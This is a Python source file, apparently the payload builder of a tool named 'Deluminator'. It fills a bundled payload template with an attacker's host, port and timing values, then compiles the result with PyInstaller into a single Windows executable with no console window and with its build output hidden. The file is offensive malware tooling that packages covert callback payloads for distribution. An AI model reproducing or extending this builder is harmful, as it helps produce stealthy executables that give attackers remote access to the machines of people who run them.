import os
import platform
import subprocess
from importlib.resources import files


# Main payload file
def main(NAME, HOST, PORT, TIME):
    print(f":: Name = {NAME}")
    print(f":: Host = {HOST}")
    print(f":: Port = {PORT}")
    print(f":: Time = {TIME}")
    print(":: Generating Payload, Please Wait...")

    curr_dir = os.getcwd()
    file_name = f"{NAME}.py"
    payload_file_path = os.path.join(curr_dir, file_name)

    # Read bundled payload template
    source = (
        files("Deluminator.engine")
        .joinpath("source")
        .read_text(encoding="utf-8")
    )

    # Replace placeholders
    source = (
        source.replace("<TIME>", str(TIME))
        .replace("<HOST>", str(HOST))
        .replace("<PORT>", str(PORT))
    )

    # Write payload file
    with open(payload_file_path, "w", encoding="utf-8") as payload_file:
        payload_file.write(source)

    # Build executable
    command(NAME)

    print(f":: Saved in dist/ directory as {NAME}.exe.")


# Compile payload into executable
def command(filename):
    curr_dir = os.getcwd()
    payload_file_path = os.path.join(curr_dir, f"{filename}.py")

    commandx = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        payload_file_path,
    ]

    subprocess.run(
        commandx,
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


# Optional cleanup
# def cleanup(filename, directory):
#     os.remove(os.path.join(directory, f"{filename}.spec"))
#     shutil.rmtree(os.path.join(directory, "build"))